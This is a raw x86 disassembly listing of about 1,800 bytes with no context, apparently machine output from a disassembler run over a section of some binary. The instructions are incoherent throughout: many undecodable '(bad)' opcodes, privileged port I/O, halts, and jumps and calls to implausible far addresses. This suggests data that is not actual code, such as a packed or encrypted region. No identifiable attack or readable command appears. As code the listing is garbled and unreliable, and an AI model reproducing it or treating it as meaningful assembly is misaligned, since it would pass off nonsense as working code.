  41498d:	sub    edx,DWORD PTR [ebp+0x20b94de0]
  414993:	pop    ds
  414994:	add    edx,ebx
  414996:	and    al,0x89
  414998:	jl     0x4149da
  41499a:	mov    ah,0x12
  41499c:	hlt    
  41499d:	sahf   
  41499e:	in     al,dx
  41499f:	add    bh,BYTE PTR [eax-0x1e]
  4149a2:	mov    WORD PTR [edx],es
  4149a4:	mov    esi,edx
  4149a6:	pop    ebp
  4149a7:	fdiv   DWORD PTR [ecx]
  4149a9:	jp     0x4149d2
  4149ab:	aad    0xab
  4149ad:	sar    ebp,cl
  4149af:	cmp    cl,ch
  4149b1:	daa    
  4149b2:	pushf  
  4149b3:	pop    ebp
  4149b4:	pop    ss
  4149b5:	sub    al,0x7a
  4149b7:	int    0xfa
  4149b9:	sub    DWORD PTR [edx],esp
  4149bb:	lods   al,BYTE PTR fs:[esi]
  4149bd:	lods   eax,DWORD PTR ds:[esi]
  4149be:	cmc    
  4149bf:	adc    ah,BYTE PTR [edi-0x45]
  4149c2:	inc    ecx
  4149c3:	or     BYTE PTR [edx-0x1399ee74],al
  4149c9:	or     DWORD PTR [ebx+ebx*4-0x3d],ebp
  4149cd:	(bad)  
  4149ce:	(bad)  
  4149cf:	xchg   ebp,eax
  4149d0:	shl    eax,1
  4149d2:	scas   al,BYTE PTR es:[edi]
  4149d3:	aam    0xb3
  4149d5:	stos   DWORD PTR es:[edi],eax
  4149d6:	ret    
  4149d7:	push   cs
  4149d8:	inc    ecx
  4149d9:	(bad)  
  4149da:	jnp    0x414a1b
  4149dc:	sub    ch,BYTE PTR [esp+esi*4-0x7578de95]
  4149e3:	fcmovne st,st(0)
  4149e5:	(bad)  
  4149e6:	fcom   DWORD PTR [eax+0x1e45bc7]
  4149ec:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ee:	(bad)  
  4149ef:	out    0xc6,al
  4149f1:	stc    
  4149f2:	sub    eax,0xc5ade186
  4149f7:	lods   eax,DWORD PTR ds:[esi]
  4149f8:	jb     0x414a3f
  4149fa:	ret    
  4149fb:	pop    es
  4149fc:	push   eax
  4149fd:	in     al,0x44
  4149ff:	push   ecx
  414a00:	push   0xffffffa2
  414a02:	xchg   edx,eax
  414a03:	clc    
  414a04:	mov    dl,BYTE PTR [eax-0x19]
  414a07:	jmp    0x1d1e1cf3
  414a0c:	fnstsw WORD PTR [esi-0x7c40a50d]
  414a12:	fwait
  414a13:	inc    ebp
  414a14:	mov    edx,0x4c85dde2
  414a19:	jg     0x414a99
  414a1b:	pop    ss
  414a1c:	pop    ecx
  414a1d:	push   esi
  414a1e:	dec    edi
  414a1f:	push   ecx
  414a20:	ja     0x414a08
  414a22:	sub    ah,BYTE PTR [edi]
  414a24:	inc    edx
  414a25:	dec    eax
  414a26:	imul   edi,DWORD PTR [edx-0x4d],0x72
  414a2a:	sub    eax,0x25ddebc2
  414a2f:	lock or al,BYTE PTR [edx]
  414a32:	xchg   ebp,eax
  414a33:	lods   al,BYTE PTR ds:[esi]
  414a34:	sbb    DWORD PTR [eax-0x7c],esi
  414a37:	sub    ebx,esi
  414a39:	sbb    eax,ecx
  414a3b:	sti    
  414a3c:	fcom   DWORD PTR [ecx]
  414a3e:	pusha  
  414a3f:	push   edx
  414a40:	imul   edi,DWORD PTR [ecx+0x546f2f18],0xe89101e5
  414a4a:	sahf   
  414a4b:	and    al,0xc
  414a4d:	push   ss
  414a4e:	mov    cl,0x5c
  414a50:	xchg   ecx,eax
  414a51:	test   eax,0xe7a82c04
  414a56:	ds dec ecx
  414a58:	(bad)  
  414a59:	and    esp,DWORD PTR [edx-0x2ab9394d]
  414a5f:	sub    al,0x34
  414a61:	cmp    DWORD PTR [eax-0x43],ecx
  414a64:	sbb    eax,0xbd23cfe8
  414a69:	das    
  414a6a:	xlat   BYTE PTR ds:[ebx]
  414a6b:	xor    DWORD PTR [ebx+0x6],ebx
  414a6e:	pusha  
  414a6f:	push   edx
  414a70:	xor    eax,0x9294a58e
  414a75:	rol    DWORD PTR [esi+0x3e640f9c],cl
  414a7b:	loopne 0x414af3
  414a7d:	push   ds
  414a7e:	clc    
  414a7f:	dec    edi
  414a80:	and    eax,DWORD PTR [eax]
  414a82:	ins    BYTE PTR es:[edi],dx
  414a83:	sbb    DWORD PTR [ebp-0x10],ecx
  414a86:	push   esp
  414a87:	inc    eax
  414a88:	sar    DWORD PTR [edi-0x6f31561a],1
  414a8e:	sub    cl,BYTE PTR [ebp+eiz*2+0x24]
  414a92:	adc    DWORD PTR [ebp+edi*2+0x25b0f4a4],eax
  414a99:	sbb    dl,ah
  414a9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a9c:	sti    
  414a9d:	mov    ds:0xbfe513a3,eax
  414aa2:	jmp    0x414a52
  414aa4:	inc    ebp
  414aa5:	pshufw mm3,QWORD PTR [ebp-0x65],0xd8
  414aaa:	outs   dx,BYTE PTR ds:[esi]
  414aab:	or     eax,0xc3220df8
  414ab0:	mov    al,ds:0xc2bcc703
  414ab5:	(bad)  
  414ab6:	out    0xa8,al
  414ab8:	jge    0x414afb
  414aba:	xchg   ebx,eax
  414abb:	adc    edi,DWORD PTR [ebp-0x54]
  414abe:	bound  ebp,QWORD PTR [ebx-0x61]
  414ac1:	in     al,dx
  414ac2:	cld    
  414ac3:	fild   DWORD PTR [edx-0x17]
  414ac7:	inc    edx
  414ac8:	inc    esi
  414ac9:	arpl   WORD PTR [esi+0x6629034e],di
  414acf:	sbb    DWORD PTR [edi+0xf],ebp
  414ad2:	inc    esi
  414ad3:	inc    edx
  414ad4:	xor    BYTE PTR [ecx+0x45bd67a7],0xe
  414adb:	xchg   edx,eax
  414adc:	sti    
  414add:	mov    al,BYTE PTR [ecx+ecx*1+0x55f13f9e]
  414ae4:	pop    ebp
  414ae5:	xchg   esp,eax
  414ae6:	sub    edx,edx
  414ae8:	lods   eax,DWORD PTR ds:[esi]
  414ae9:	xchg   ebp,ebp
  414aeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aec:	jecxz  0x414b6a
  414aee:	xchg   esp,eax
  414aef:	bswap  edi
  414af1:	adc    ch,BYTE PTR [esi+0x7a]
  414af4:	lahf   
  414af5:	in     al,dx
  414af6:	or     al,0x93
  414af8:	mov    dh,0xf7
  414afa:	jb     0x414a94
  414afc:	pushf  
  414afd:	jb     0x414ae7
  414aff:	ds pop ebp
  414b01:	xor    DWORD PTR [ecx-0x33a22d37],ebp
  414b07:	ss cwde 
  414b09:	sub    eax,0x5fac9427
  414b0e:	or     esp,esp
  414b10:	js     0x414aa1
  414b12:	pop    edi
  414b13:	xor    esi,esp
  414b15:	(bad)  
  414b16:	loopne 0x414b88
  414b18:	xchg   ebp,eax
  414b19:	in     al,dx
  414b1a:	sub    dh,BYTE PTR [ebx]
  414b1c:	jbe    0x414ab9
  414b1e:	in     eax,dx
  414b1f:	out    0x12,eax
  414b21:	fidiv  WORD PTR [ebx-0x3d]
  414b24:	and    edx,eax
  414b26:	adc    al,0x8
  414b28:	lock inc eax
  414b2a:	(bad)  [eax]
  414b2c:	mov    edi,?
  414b2e:	mov    ebp,0x1f9ab661
  414b33:	stos   BYTE PTR es:[edi],al
  414b34:	jge    0x414b79
  414b36:	add    ebp,ebp
  414b38:	pop    eax
  414b39:	jg     0x414b93
  414b3b:	sub    DWORD PTR [ebx+0x59],ecx
  414b3e:	cmp    eax,0x5c4ed721
  414b43:	or     ah,al
  414b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b46:	js     0x414b9d
  414b48:	test   DWORD PTR [ebx+edi*2-0x3c4b3bec],edx
  414b4f:	mov    bh,0x2
  414b51:	aaa    
  414b52:	inc    ecx
  414b53:	mov    bl,0x57
  414b55:	mov    edi,0xd1634c0
  414b5a:	fldenv [ecx-0x17]
  414b5d:	inc    eax
  414b5e:	and    dl,BYTE PTR [eax+0xe4168bb]
  414b64:	adc    DWORD PTR [edx+0x61ee4dc3],ebp
  414b6a:	pop    edi
  414b6b:	pop    ds
  414b6c:	call   0x8b6a:0x19d5d9ed
  414b73:	pop    esp
  414b74:	xchg   BYTE PTR [ecx+0x159c9cc5],cl
  414b7a:	cmp    eax,0x45244280
  414b7f:	mov    edx,0x63603c01
  414b84:	clc    
  414b85:	adc    al,0x13
  414b87:	dec    ecx
  414b88:	lods   al,BYTE PTR ds:[esi]
  414b89:	in     al,0xb9
  414b8b:	or     esp,DWORD PTR [ebp-0x1c]
  414b8e:	dec    ebx
  414b8f:	cli    
  414b90:	hlt    
  414b91:	add    DWORD PTR [ebx+0x6baf1730],0x3b
  414b98:	cmp    BYTE PTR [ebx+ecx*4-0x2b9b944c],dh
  414b9f:	into   
  414ba0:	dec    edi
  414ba2:	cs pop es
  414ba4:	add    al,0x7e
  414ba6:	lds    ebp,FWORD PTR [edx+0x3eba76b3]
  414bac:	pop    esp
  414bad:	push   0x1a60be69
  414bb2:	daa    
  414bb3:	push   ds
  414bb4:	imul   ebp,DWORD PTR [eax],0xffffff8b
  414bb7:	and    DWORD PTR [eax+0x5e],esi
  414bba:	aam    0x2d
  414bbc:	(bad)  
  414bbe:	jle    0x414c03
  414bc0:	pop    ebp
  414bc1:	cmc    
  414bc2:	xchg   esp,eax
  414bc3:	pop    ebp
  414bc4:	adc    eax,edi
  414bc6:	int3   
  414bc7:	jge    0x414b9f
  414bc9:	neg    BYTE PTR [eax]
  414bcb:	mov    dl,0x8d
  414bcd:	xor    bh,ch
  414bcf:	and    eax,0x84c44b46
  414bd4:	xchg   esp,eax
  414bd5:	sub    eax,0x8357d867
  414bda:	clc    
  414bdb:	fstp   QWORD PTR gs:[esi-0x14]
  414bdf:	push   0xffffff99
  414be1:	and    eax,0xfc4d7fa0
  414be6:	ins    BYTE PTR es:[edi],dx
  414be7:	les    ebp,FWORD PTR [eax-0x51]
  414bea:	adc    ecx,DWORD PTR [ebp+0x78f46b05]
  414bf0:	in     eax,0xf3
  414bf2:	daa    
  414bf3:	(bad)  
  414bf4:	addr16 leave 
  414bf6:	xor    ebp,DWORD PTR [edi-0x3d35acac]
  414bfc:	mov    WORD PTR [esi-0x72],cs
  414bff:	fisub  DWORD PTR [ebp-0x4e5bf69d]
  414c05:	adc    eax,0x7fb7e7a6
  414c0a:	dec    edx
  414c0b:	shl    bl,cl
  414c0d:	mov    dh,BYTE PTR [ebx+0x56d44bdd]
  414c13:	push   0xffffff80
  414c15:	pop    esi
  414c16:	and    BYTE PTR [ecx+0x34e40f55],bh
  414c1c:	rcr    BYTE PTR [ecx+0x29],cl
  414c1f:	adc    al,0x5c
  414c21:	repz gs jae 0x414c07
  414c25:	xor    DWORD PTR [ecx+0x5c],ebp
  414c28:	fwait
  414c29:	test   DWORD PTR [esp+ebp*2-0x62927c5f],eax
  414c30:	adc    al,BYTE PTR [ecx+esi*2+0x400d9d90]
  414c37:	and    ebx,DWORD PTR [ecx]
  414c39:	jns    0x414c2a
  414c3b:	dec    ebp
  414c3c:	fprem  
  414c3e:	stos   BYTE PTR es:[edi],al
  414c3f:	pop    es
  414c40:	(bad)  
  414c41:	or     BYTE PTR [ebp+0xc],al
  414c44:	sub    DWORD PTR [esi-0x23],eax
  414c47:	fiadd  WORD PTR [ebx]
  414c49:	add    BYTE PTR [eax-0x40],ch
  414c4c:	pop    ecx
  414c4d:	ins    DWORD PTR es:[edi],dx
  414c4e:	clc    
  414c4f:	gs mov bh,0x8
  414c52:	mov    esi,0xb20aa4ac
  414c57:	cmp    eax,0xa3aa225e
  414c5c:	jne    0x414ca3
  414c5e:	scas   eax,DWORD PTR es:[edi]
  414c5f:	icebp  
  414c60:	mov    bh,0xff
  414c62:	loope  0x414c69
  414c64:	jmp    DWORD PTR [ecx-0x2a]
  414c67:	push   0x3f222437
  414c6c:	jmp    0xc9033124
  414c71:	popa   
  414c72:	repz into 
  414c74:	dec    edx
  414c75:	gs or  al,0xbf
  414c78:	(bad)  
  414c79:	pushf  
  414c7a:	popf   
  414c7b:	(bad)  
  414c7c:	jo     0x414c86
  414c7e:	lds    esp,FWORD PTR gs:[esi+0x7b]
  414c82:	push   eax
  414c83:	sbb    ah,bh
  414c85:	cmp    BYTE PTR ds:[esi-0x1aadaee2],bh
  414c8c:	nop
  414c8d:	jle    0x414c97
  414c8f:	imul   eax,DWORD PTR [edi-0x691dc7],0x8a9d3e6d
  414c99:	lds    esi,FWORD PTR [edx+0x1]
  414c9c:	in     al,dx
  414c9d:	pop    ebx
  414c9e:	stc    
  414c9f:	and    eax,0xd143ee1b
  414ca4:	mov    dl,0x1a
  414ca6:	test   esi,eax
  414ca8:	mov    ebp,DWORD PTR [ebx+edx*8+0x5c]
  414cac:	jge    0x414c72
  414cae:	call   0x8b3e31b7
  414cb3:	jne    0x414cc9
  414cb5:	dec    ecx
  414cb6:	(bad)  
  414cb7:	xor    al,0xba
  414cb9:	add    dl,BYTE PTR [edi+0x12]
  414cbc:	mov    al,0x12
  414cbe:	push   ecx
  414cbf:	scas   eax,DWORD PTR es:[edi]
  414cc0:	lea    esp,[edi]
  414cc2:	sahf   
  414cc3:	rcl    DWORD PTR [ecx-0x54],cl
  414cc6:	cmp    al,0x6a
  414cc8:	popa   
  414cc9:	hlt    
  414cca:	xchg   ebp,eax
  414ccb:	test   BYTE PTR [eax],ch
  414ccd:	call   0xbe2ea414
  414cd2:	loopne 0x414d51
  414cd4:	retf   
  414cd5:	adc    DWORD PTR [ecx-0x2e47400f],ecx
  414cdb:	lods   al,BYTE PTR ds:[esi]
  414cdc:	xor    esi,ebx
  414cde:	xchg   edi,eax
  414cdf:	ss test al,0xfb
  414ce2:	js     0x414ca9
  414ce4:	push   0x43
  414ce6:	sub    eax,edx
  414ce8:	fistp  QWORD PTR [edx-0x7b388b81]
  414cee:	add    ch,0xe6
  414cf1:	jmp    0x414d57
  414cf3:	adc    eax,0xaadc0de1
  414cf8:	jno    0x414d47
  414cfa:	leave  
  414cfb:	mov    bl,0xac
  414cfd:	xor    eax,0xba6cb02f
  414d02:	arpl   WORD PTR [ecx],di
  414d04:	loopne 0x414c9c
  414d06:	imul   edx,DWORD PTR [esi+0x64],0x674c5eb3
  414d0d:	adc    ch,BYTE PTR ds:0x7ec0db70
  414d13:	pop    ecx
  414d14:	inc    ebp
  414d15:	sub    bl,BYTE PTR [eax-0x4e68c64b]
  414d1b:	adc    eax,0xbe1829bd
  414d20:	sahf   
  414d21:	xchg   ebp,eax
  414d22:	ret    0x2d6e
  414d25:	push   es
  414d26:	add    al,0x85
  414d28:	jbe    0x414d0b
  414d2a:	icebp  
  414d2b:	into   
  414d2c:	jle    0x414dab
  414d2e:	or     bh,BYTE PTR [ebx-0x7f]
  414d31:	xor    al,0x39
  414d33:	xor    DWORD PTR [ebp-0x4d],eax
  414d36:	jle    0x414cc3
  414d38:	lock push ecx
  414d3a:	pop    ecx
  414d3b:	jl     0x414ccd
  414d3d:	test   DWORD PTR [edi],esi
  414d3f:	pop    es
  414d40:	scas   al,BYTE PTR es:[edi]
  414d41:	in     al,0x23
  414d43:	scas   al,BYTE PTR es:[edi]
  414d44:	fwait
  414d45:	mov    esi,0xdb3cc32f
  414d4a:	jbe    0x414ce5
  414d4c:	mov    ch,0xde
  414d4e:	fstp   TBYTE PTR [ecx]
  414d50:	sub    DWORD PTR [esi],edx
  414d52:	(bad)  
  414d53:	xor    cl,cl
  414d55:	test   BYTE PTR [eax+0x69],dl
  414d58:	lods   eax,DWORD PTR ds:[esi]
  414d59:	lock push ebx
  414d5b:	jecxz  0x414d3a
  414d5d:	xchg   DWORD PTR [ebx],ebp
  414d5f:	hlt    
  414d60:	not    BYTE PTR [ebx+eax*8-0x12]
  414d64:	mov    eax,0x947d1166
  414d69:	or     BYTE PTR [ebx+eiz*4+0x4f],dl
  414d6d:	sub    DWORD PTR [ebp-0x26a051a4],esi
  414d73:	arpl   WORD PTR [edx],di
  414d75:	dec    ebx
  414d76:	mov    ds,WORD PTR [ecx]
  414d78:	lock or al,0x7f
  414d7b:	out    0xbc,al
  414d7d:	enter  0x1857,0x7b
  414d81:	pop    esi
  414d82:	pop    esi
  414d83:	ja     0x414df5
  414d85:	aam    0xaa
  414d87:	je     0x414d58
  414d89:	test   eax,0x7ab651bf
  414d8e:	xchg   esp,eax
  414d8f:	callw  0xd0c2
  414d93:	shr    BYTE PTR [eax+0x5e],cl
  414d96:	push   ecx
  414d97:	cmp    bl,ah
  414d99:	scas   al,BYTE PTR es:[edi]
  414d9a:	push   ecx
  414d9b:	xchg   ecx,eax
  414d9c:	mov    eax,ds:0xeb9d1caa
  414da1:	lock jmp 0x414e19
  414da4:	loope  0x414d2d
  414da6:	arpl   WORD PTR [ecx+0x38],ax
  414da9:	aam    0x79
  414dab:	icebp  
  414dac:	(bad)  
  414dad:	mov    al,0x7a
  414daf:	add    eax,0xae448e65
  414db4:	xor    BYTE PTR [ecx-0x17],ch
  414db7:	adc    ebx,edi
  414db9:	inc    edi
  414dba:	jae    0x414e39
  414dbc:	jns    0x414ded
  414dbe:	std    
  414dbf:	test   al,0x81
  414dc1:	push   esp
  414dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dc3:	popa   
  414dc4:	jae    0x414dc1
  414dc6:	mov    eax,ds:0xa262df2d
  414dcb:	add    al,0xa5
  414dcd:	mov    dl,0x33
  414dcf:	lods   eax,DWORD PTR ds:[esi]
  414dd0:	and    eax,0x8f9fe423
  414dd5:	sbb    dl,dh
  414dd7:	xchg   ecx,eax
  414dd8:	icebp  
  414dd9:	sti    
  414dda:	push   es
  414ddb:	inc    eax
  414ddc:	dec    edx
  414ddd:	cwde   
  414dde:	inc    esi
  414ddf:	jo     0x414da4
  414de1:	pop    es
  414de2:	push   edx
  414de3:	inc    ebp
  414de4:	and    BYTE PTR [eax+0x438560f3],bh
  414dea:	jl     0x414d9a
  414dec:	mov    esp,edx
  414dee:	sbb    BYTE PTR [edx+0x7a],ch
  414df1:	cmp    edx,DWORD PTR ds:0xa7fb7bf0
  414df7:	test   al,0x99
  414df9:	mov    eax,0xa2576c81
  414dfe:	xor    cl,BYTE PTR [ebx-0x57117a47]
  414e04:	push   ebp
  414e05:	es cli 
  414e07:	push   es
  414e08:	mov    bh,0x2f
  414e0a:	inc    edx
  414e0b:	popf   
  414e0c:	imul   ecx,DWORD PTR [ecx],0x37
  414e0f:	xchg   DWORD PTR [ecx+0x50a6ccfd],ecx
  414e15:	pop    esi
  414e16:	aas    
  414e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e18:	into   
  414e19:	clc    
  414e1a:	fadd   QWORD PTR [edi]
  414e1c:	inc    ebp
  414e1d:	shl    cl,1
  414e1f:	inc    ch
  414e21:	mov    bl,0x12
  414e23:	pop    ebx
  414e24:	push   edi
  414e25:	stc    
  414e26:	aam    0xb9
  414e28:	inc    eax
  414e29:	dec    ebx
  414e2a:	mov    cl,0xba
  414e2c:	or     ebp,DWORD PTR [edi+0x3eae0ccb]
  414e32:	outs   dx,BYTE PTR ds:[esi]
  414e33:	iret   
  414e34:	ins    DWORD PTR es:[edi],dx
  414e35:	xchg   DWORD PTR ds:0xc9a9c700,edi
  414e3b:	inc    ecx
  414e3c:	push   esi
  414e3d:	in     eax,dx
  414e3e:	cs sbb ecx,ebp
  414e41:	stc    
  414e42:	dec    ebx
  414e43:	sub    bh,0xac
  414e46:	inc    ebx
  414e47:	fsubp  st(0),st
  414e49:	mov    cl,0xed
  414e4b:	lods   eax,DWORD PTR ds:[esi]
  414e4c:	mov    ah,0x41
  414e4e:	push   cs
  414e4f:	xor    ecx,0xffffffbd
  414e52:	add    al,0xf5
  414e54:	mov    bl,0x56
  414e56:	cmc    
  414e57:	pop    ds
  414e58:	loop   0x414df6
  414e5a:	fs fs repz push ss
  414e5e:	pop    ss
  414e5f:	addr16 pop ecx
  414e61:	js     0x414e27
  414e63:	sub    al,0x2c
  414e65:	into   
  414e66:	inc    ecx
  414e67:	cmp    DWORD PTR [ebx+0x63],esi
  414e6a:	mov    cl,0xaf
  414e6c:	sbb    al,0x70
  414e6e:	out    dx,al
  414e6f:	mov    edi,0x9b0b27f6
  414e74:	xchg   esi,eax
  414e75:	dec    eax
  414e76:	lahf   
  414e77:	daa    
  414e78:	sahf   
  414e79:	cmp    BYTE PTR [ebx],cl
  414e7b:	inc    al
  414e7d:	xor    esp,esi
  414e7f:	clc    
  414e80:	outs   dx,DWORD PTR ds:[esi]
  414e81:	ficomp DWORD PTR [eax]
  414e83:	shl    esi,1
  414e85:	adc    al,0xd6
  414e87:	push   es
  414e88:	mov    DWORD PTR [eax+0x4a33d3b5],esp
  414e8e:	xchg   DWORD PTR [ecx],ebx
  414e90:	aaa    
  414e91:	jno    0x414e90
  414e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e94:	adc    eax,DWORD PTR [esi-0x45]
  414e97:	jp     0x414ec9
  414e99:	leave  
  414e9a:	inc    esp
  414e9b:	cwde   
  414e9c:	in     al,dx
  414e9d:	push   esp
  414e9e:	sub    eax,0xf8f2fd96
  414ea3:	rcl    BYTE PTR [edi],0x7a
  414ea6:	iret   
  414ea7:	aad    0x94
  414ea9:	(bad)  
  414eaa:	adc    al,0xe5
  414eac:	aaa    
  414ead:	xchg   BYTE PTR [ebx-0x2b],cl
  414eb0:	add    dh,al
  414eb2:	mov    eax,ds:0x71820636
  414eb7:	mov    DWORD PTR [eax],edx
  414eb9:	mov    dh,0xe9
  414ebb:	mov    eax,ds:0xe21440b3
  414ec0:	fcom   QWORD PTR [ebp+eax*2-0x4]
  414ec4:	ins    BYTE PTR es:[edi],dx
  414ec5:	xchg   edx,eax
  414ec6:	cmp    al,0x4
  414ec8:	mov    ch,0x85
  414eca:	jmp    0xeb792bb5
  414ecf:	jno    0x414e8c
  414ed1:	xor    BYTE PTR [ecx],bl
  414ed3:	out    dx,al
  414ed4:	pop    ds
  414ed5:	or     DWORD PTR [esi-0x218c39f5],ebp
  414edb:	enter  0x3983,0x68
  414edf:	(bad)  
  414ee0:	or     al,0xd5
  414ee2:	push   ebx
  414ee3:	sbb    BYTE PTR [eax-0x2e],bl
  414ee6:	mov    edi,0x8178ec3c
  414eeb:	inc    ecx
  414eec:	xchg   edx,eax
  414eed:	or     eax,0x560878dc
  414ef2:	inc    edi
  414ef3:	sub    eax,0x7ecb3525
  414ef8:	mov    dl,0x3d
  414efa:	push   ds
  414efb:	rol    esp,cl
  414efd:	inc    esp
  414efe:	jbe    0x414f4a
  414f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f01:	imul   eax,DWORD PTR [edx-0x7fc6d970],0xffffffef
  414f08:	pop    ecx
  414f09:	jecxz  0x414f44
  414f0b:	xor    DWORD PTR [ecx+0x42],edi
  414f0e:	fmulp  st(4),st
  414f10:	add    al,0xc5
  414f12:	das    
  414f13:	sub    dh,BYTE PTR [eax+0x40cd3b56]
  414f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f1a:	pop    eax
  414f1b:	arpl   WORD PTR [ebp+0x30332a18],cx
  414f21:	push   esp
  414f22:	and    DWORD PTR [ebx+0x66fea8e8],eax
  414f28:	scas   al,BYTE PTR es:[edi]
  414f29:	sahf   
  414f2a:	(bad)  
  414f2b:	fstp   QWORD PTR [edx]
  414f2d:	ror    DWORD PTR [ebx],1
  414f2f:	xchg   edx,eax
  414f30:	aas    
  414f31:	xchg   ecx,eax
  414f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f33:	jle    0x414f73
  414f35:	leave  
  414f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f37:	mov    DWORD PTR [edx+edi*1],edi
  414f3a:	ret    
  414f3b:	outs   dx,BYTE PTR ds:[esi]
  414f3c:	sbb    esi,0xf5acddde
  414f42:	scas   al,BYTE PTR es:[edi]
  414f43:	add    DWORD PTR [eax-0x358323d4],edx
  414f49:	std    
  414f4a:	pushf  
  414f4b:	outs   dx,BYTE PTR ds:[esi]
  414f4c:	retf   
  414f4d:	jnp    0x414f35
  414f4f:	pop    esp
  414f50:	xchg   ebx,eax
  414f51:	mov    esp,ds
  414f53:	jecxz  0x414f0c
  414f55:	inc    edx
  414f56:	or     al,BYTE PTR [ebp+esi*1+0x6da5bdec]
  414f5d:	iret   
  414f5e:	icebp  
  414f5f:	sbb    BYTE PTR [ecx],ch
  414f61:	xchg   ebx,eax
  414f62:	rcl    ecx,1
  414f64:	pop    ebp
  414f65:	lds    edx,FWORD PTR [edi+edi*2+0x126c8330]
  414f6c:	dec    eax
  414f6d:	xchg   esi,eax
  414f6e:	jg     0x414f4f
  414f70:	adc    edi,DWORD PTR [edi-0x7e]
  414f73:	cwde   
  414f74:	xchg   BYTE PTR [edx],ch
  414f76:	mov    dl,al
  414f78:	shl    DWORD PTR [eax],1
  414f7a:	sub    BYTE PTR [eax],dh
  414f7c:	mov    ch,0xb
  414f7e:	mov    ds:0x35894e91,al
  414f83:	imul   ecx,esi,0x794a6e0e
  414f89:	ja     0x414f15
  414f8b:	aas    
  414f8c:	or     al,0x72
  414f8e:	ret    0x5cae
  414f91:	mov    esi,0x962e37b3
  414f96:	dec    edx
  414f97:	(bad)  
  414f98:	push   cs
  414f99:	je     0x414fcc
  414f9b:	add    al,0x3
  414f9d:	dec    BYTE PTR [edi]
  414f9f:	pop    edi
  414fa0:	ret    0x6dcc
  414fa3:	jp     0x414ff5
  414fa5:	mov    dl,0x77
  414fa7:	sub    BYTE PTR es:[ebp+0x55475e8],cl
  414fae:	sbb    dh,cl
  414fb0:	jmp    0x6ee9:0x61baf229
  414fb7:	test   BYTE PTR [edi-0x1f],dl
  414fba:	push   edi
  414fbb:	aam    0x13
  414fbd:	(bad)  
  414fbe:	out    0xa0,al
  414fc0:	pusha  
  414fc1:	int    0xc9
  414fc3:	out    dx,eax
  414fc4:	repz iret 
  414fc6:	sub    ebp,DWORD PTR [edi]
  414fc8:	int3   
  414fc9:	pop    ss
  414fca:	mov    ebx,0x4f47a9b4
  414fcf:	les    edi,FWORD PTR [ebp+0xa495264]
  414fd5:	pop    eax
  414fd6:	icebp  
  414fd7:	jmp    0xad73298a
  414fdc:	(bad)  
  414fde:	pusha  
  414fdf:	out    dx,eax
  414fe0:	jb     0x414f69
  414fe2:	xchg   edx,eax
  414fe3:	xchg   edi,eax
  414fe4:	nop
  414fe5:	push   esp
  414fe6:	xor    ch,BYTE PTR [eax-0x5f]
  414fe9:	and    ecx,DWORD PTR [eax+edi*2-0x671536d7]
  414ff0:	bnd jnp 0x414fa6
  414ff3:	rcr    eax,cl
  414ff5:	mov    al,0x58
  414ff7:	mov    WORD PTR [ebp+eax*1+0x43dc923f],ds
  414ffe:	xor    edx,esp
  415000:	pop    ebx
  415001:	and    eax,edx
  415003:	jne    0x415012
  415005:	or     DWORD PTR [ebx-0x34],ecx
  415008:	jp     0x414fb1
  41500a:	dec    esp
  41500b:	and    esp,DWORD PTR [ecx+0x7f2a94e4]
  415011:	and    al,0xb
  415013:	cmc    
  415014:	sub    edx,esp
  415016:	xor    DWORD PTR [eax-0x42a68170],edi
  41501c:	mov    dl,0xb7
  41501e:	js     0x414fbb
  415020:	mov    ?,WORD PTR [edi-0x11]
  415023:	jle    0x415010
  415025:	fsubr  DWORD PTR [ecx-0x5b34484f]
  41502b:	jb     0x415017
  41502d:	js     0x4150a4
  41502f:	popa   
  415030:	popf   
  415031:	jmp    0xbe66:0x1c17d95f
  415038:	jbe    0x414fce
  41503a:	push   ebp
  41503b:	scas   eax,DWORD PTR es:[edi]
  41503c:	gs loopne 0x415057
  41503f:	xor    eax,0x7330b161
  415044:	ret    0x7782
  415047:	mov    ebx,0x73aefec5
  41504c:	ins    DWORD PTR es:[edi],dx
  41504d:	mov    dl,0xbb
  41504f:	imul   eax,DWORD PTR [ebx+0x58],0xa36f3e83
  415056:	loopne 0x415028
  415058:	loop   0x414fe5
  41505a:	mov    bl,0xbc
  41505c:	adc    eax,0xc903a6cd
  415061:	or     DWORD PTR [eax],edx
  415063:	sub    esi,DWORD PTR [edx+esi*8]
  415066:	shr    BYTE PTR [edx+0x1],0x35
  41506a:	arpl   WORD PTR [edx-0x1],bx
  41506d:	and    ebp,esp
  41506f:	stos   BYTE PTR es:[edi],al
  415070:	cmp    esp,0x15f20f33
  415076:	jl     0x415008
  415078:	add    esi,ebp
  41507a:	sti    
  41507b:	sbb    ch,BYTE PTR [ebp+0x14a67f1e]
  415081:	js     0x41500b
  415083:	test   ecx,esp
  415085:	or     ebp,DWORD PTR [edi+0x63]
  415088:	sub    eax,eax
  41508a:	fild   DWORD PTR [edx-0x4d]
  41508d:	fisttp WORD PTR [esi-0x4c4962c5]
  415093:	sbb    eax,0xedea1e33
  415098:	push   es
  415099:	int3   
  41509a:	jle    0x4150d3
  41509c:	mov    al,ds:0x3dd37f8f
  4150a1:	rcl    BYTE PTR [ecx+0x706d0335],cl
  4150a7:	daa    
  4150a8:	loop   0x4150a8
  4150aa:	inc    edi
  4150ab:	stos   BYTE PTR es:[edi],al
  4150ac:	mov    ch,0x7a
  4150ae:	mov    dl,0xd7
  4150b0:	dec    esp
  4150b1:	imul   edx,DWORD PTR [edx],0x3d0f675f
  4150b7:	mov    ecx,0xb17d38e2
  4150bc:	test   eax,0xa3ace3bc
  4150c1:	ins    DWORD PTR es:[edi],dx
  4150c2:	sub    ah,BYTE PTR [edx-0x27]
  4150c5:	pop    ebx
  4150c6:	mov    ds:0xe2a42e66,al
  4150cb:	arpl   WORD PTR [ebx-0x4b6af17e],dx
  4150d1:	stos   DWORD PTR es:[edi],eax
  4150d2:	sbb    BYTE PTR [esi+edi*1],al
  4150d5:	nop
